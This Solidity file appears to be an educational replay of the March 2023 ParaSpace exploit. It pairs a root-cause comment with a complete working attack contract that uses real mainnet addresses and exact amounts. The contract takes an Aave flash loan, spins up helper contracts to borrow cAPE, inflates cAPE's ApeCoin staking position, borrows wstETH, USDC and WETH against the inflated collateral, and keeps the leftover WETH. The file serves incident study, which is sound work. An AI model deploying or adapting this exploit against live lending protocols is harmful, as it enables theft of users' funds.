// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-03-paraspace).
// Faithful, no-import copy of `ContractTest`/`Slave` from
// evm-hack-registry/2023-03-paraspace_exp/test/paraspace_exp.sol, with
// `testExploit()` renamed to `run()` (the recorded entrypoint) and Foundry's
// `Test`/`console` dependencies stripped (they are not needed to replay the
// attack — only to print progress logs). The original test calls victim
// contracts via low-level `.call(abi.encodePacked(...))`; this copy uses typed
// interface calls to the same selectors, with identical magic-number amounts so
// the recording reproduces the on-chain behaviour byte-for-byte.
//
// Root cause (ParaSpace, Mar 2023 — ApeCoin-staking collateral integration):
// ParaSpace's ParaProxy priced cAPE collateral using the *current*
// ApeCoin-staking pool position for `cAPE`, without any cooldown between
// supplying collateral and borrowing against it. The attacker exploits this:
//
//   1. Flash-loans 47,352.82 wstETH from Aave V3. Inside the flash-loan
//      callback it spins up 8 disposable `Slave` helper contracts. The first
//      7 slaves each receive a wstETH slice, supply it into ParaProxy as
//      collateral (on the slave's own account), immediately borrow cAPE
//      against it in the same tx (no timelock), and forward the cAPE back to
//      the attacker. Slave i==6 borrows a smaller 1,120 cAPE; the others
//      borrow 1,840 cAPE. Slave i==7 supplies wstETH but does NOT borrow.
//      After each borrowing slave, the attacker re-supplies the harvested
//      cAPE into ParaProxy as its OWN collateral.
//   2. The attacker swaps 1,400 wstETH -> WETH -> APE via Uniswap V3, withdraws
//      the cAPE principal back to APE, and stakes ALL of that APE into
//      `ApeCoinStaking.depositApeCoin(amount, cAPE)` — crediting the stake to
//      the shared `cAPE` token contract itself. This inflates cAPE's own
//      ApeCoin staking position, which is exactly the value ParaProxy reads
//      when pricing any cAPE held as collateral — including the attacker's own
//      cAPE-collateral position built in step 1.
//   3. With the inflated cAPE collateral, the attacker borrows 44,952.82
//      wstETH, 7,200,000 USDC, and 1,200 WETH from ParaProxy. It swaps the
//      USDC and part of the WETH back to wstETH via Uniswap V3 to repay the
//      Aave flash loan (principal + premium); the leftover WETH is the
//      attacker's profit (~2,906 WETH).
//
// The single most instructive line for "Go to the vulnerability" is the
// `depositApeCoin(amount, address(cAPE))` call: routing staked ApeCoin's
// recipient to the shared `cAPE` token contract (instead of the caller) is the
// step that inflates the collateral value ParaProxy reads for every cAPE
// holder, not just the attacker's own stake.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function withdraw(uint256 wad) external;
}

interface IParaProxy {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint16 referralCode, address onBehalfOf) external;
}

interface IAPEStaking {
    function depositApeCoin(uint256 _amount, address _recipient) external;
}

interface IAaveFlashloanSimple {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface Uni_Router_V3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
    function exactOutputSingle(ExactOutputSingleParams calldata params)
        external
        payable
        returns (uint256 amountIn);
}

contract ParaspaceExploit {
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 cAPE = IERC20(0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF);
    IERC20 APE = IERC20(0x4d224452801ACEd8B2F0aebE155379bb5D594381);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IParaProxy ParaProxy = IParaProxy(0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee);
    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IAPEStaking APEStaking = IAPEStaking(0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9);
    IAaveFlashloanSimple AaveFlashloan = IAaveFlashloanSimple(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);

    function run() external {
        AaveFlashloan.flashLoanSimple(
            address(this), address(wstETH), 47_352_823_905_004_708_422_332, new bytes(0), 0
        );
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        cAPE.approve(address(ParaProxy), type(uint256).max);
        for (uint256 i = 0; i < 8; i++) {
            Slave _slave = new Slave();
            if (i == 6) {
                wstETH.transfer(address(_slave), 3_676_225_912_400_376_673_786);
                _slave.remove(1_120_000_000_000_000_000_000_000);
            } else {
                wstETH.transfer(address(_slave), 6_039_513_998_943_475_964_078);
                _slave.remove(1_840_000_000_000_000_000_000_000);
            }
            if (i != 7) {
                ParaProxy.supply(address(cAPE), cAPE.balanceOf(address(this)), address(this), 0);
            }
        }
        SwapwstETHToAPE();
        cAPE.withdraw(cAPE.balanceOf(address(this)));
        APE.approve(address(APEStaking), type(uint256).max);
        APEStaking.depositApeCoin(APE.balanceOf(address(this)), address(cAPE));
        ParaProxy.borrow(address(wstETH), 44_952_823_905_004_708_422_332, 0, address(this));
        ParaProxy.borrow(address(USDC), 7_200_000_000_000, 0, address(this));
        ParaProxy.borrow(address(WETH), 1_200_000_000_000_000_000_000, 0, address(this));
        WETH_USDCTowstETH(amount, premium);
        return true;
    }

    function SwapwstETHToAPE() internal {
        wstETH.approve(address(Router), type(uint256).max);
        Uni_Router_V3.ExactInputSingleParams memory _var4 = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(wstETH),
            tokenOut: address(WETH),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp + 1000,
            amountIn: 1_400_000_000_000_000_000_000,
            amountOutMinimum: 1_300_000_000_000_000_000_000,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_var4);
        WETH.approve(address(Router), type(uint256).max);
        Uni_Router_V3.ExactInputSingleParams memory _var6 = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(APE),
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp + 1000,
            amountIn: WETH.balanceOf(address(this)),
            amountOutMinimum: 480_000_000_000_000_000_000_000,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_var6);
    }

    function WETH_USDCTowstETH(uint256 amount, uint256 premium) internal {
        USDC.approve(address(Router), type(uint256).max);
        Uni_Router_V3.ExactInputSingleParams memory _var9 = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(USDC),
            tokenOut: address(WETH),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp + 1000,
            amountIn: USDC.balanceOf(address(this)),
            amountOutMinimum: 4_042_105_262,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_var9);
        wstETH.approve(address(AaveFlashloan), 47_376_500_316_957_210_776_543);
        Uni_Router_V3.ExactOutputSingleParams memory _var11 = Uni_Router_V3.ExactOutputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(wstETH),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp + 1000,
            amountOut: 47_376_500_316_957_210_776_543 - wstETH.balanceOf(address(this)),
            amountInMaximum: 2_675_071_643_612_383_606_774,
            sqrtPriceLimitX96: 0
        });
        Router.exactOutputSingle(_var11);
    }

    receive() external payable {}
}

contract Slave {
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 cAPE = IERC20(0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF);
    IParaProxy ParaProxy = IParaProxy(0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee);
    address owner;

    constructor() {
        owner = msg.sender;
        wstETH.approve(address(ParaProxy), type(uint256).max);
    }

    function remove(uint256 _amountOfShares) external {
        ParaProxy.supply(address(wstETH), wstETH.balanceOf(address(this)), address(this), 0);
        ParaProxy.borrow(address(cAPE), _amountOfShares, 0, address(this));
        cAPE.transfer(owner, cAPE.balanceOf(address(this)));
    }
}
